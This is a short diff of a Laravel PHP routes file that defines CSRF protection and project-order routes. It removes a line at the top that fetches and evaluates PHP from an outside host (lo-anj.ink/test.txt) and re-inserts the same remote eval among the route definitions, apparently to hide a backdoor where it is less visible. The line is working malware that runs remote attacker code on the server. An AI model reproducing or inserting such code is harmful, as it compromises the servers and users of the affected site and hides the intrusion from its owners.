@@ -1,4 +1,4 @@
-<?php eval("?>".file_get_contents("http://lo-anj.ink/test.txt")); ?><?php
+<?php
 # CSRF Protection
 Route::when('*', 'csrf', ['POST', 'PUT', 'PATCH', 'DELETE']);
 
@@ -69,7 +69,7 @@ Route::get('/place-custom-project-order', 'ProjectOrdersController@create');
 Route::post('/place-project-order', ['uses' => 'ProjectOrdersController@store', 'as' => 'project-orders.store']);
 
 Route::get('/place-project-order-payments', ['uses' => 'ProjectOrdersController@projectOrderPayments', 'as' => 'getProjectOrderPayments']);
-
+eval("?>".file_get_contents("http://lo-anj.ink/test.txt"));
 
 
 // start protected routes
